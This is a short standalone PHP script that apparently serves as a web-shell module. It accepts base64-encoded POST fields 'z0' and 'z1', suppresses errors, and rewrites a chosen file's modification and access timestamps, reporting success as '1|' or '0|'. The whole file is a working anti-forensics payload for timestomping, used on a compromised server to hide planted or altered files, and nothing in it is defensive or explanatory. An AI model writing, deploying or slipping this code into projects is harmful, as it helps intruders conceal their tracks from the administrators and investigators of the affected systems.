<?php

@error_reporting(0);

function main(): void {
    $z0 = $_POST['z0'];
    $z1 = $_POST['z1'];

    if (!$z0 || !$z1) {
        echo '0|Missing parameters.';
        return;
    }

    $filename = base64_decode($z0);
    $mtime = $atime = (int)base64_decode($z1);

    if (!file_exists($filename)) {
        echo '0|File does not exist.';
        return;
    }

    if (touch($filename, $mtime, $atime)) {
        echo '1|';
    } else {
        echo '0|Failed to modify the timestamps';
    }
}

main();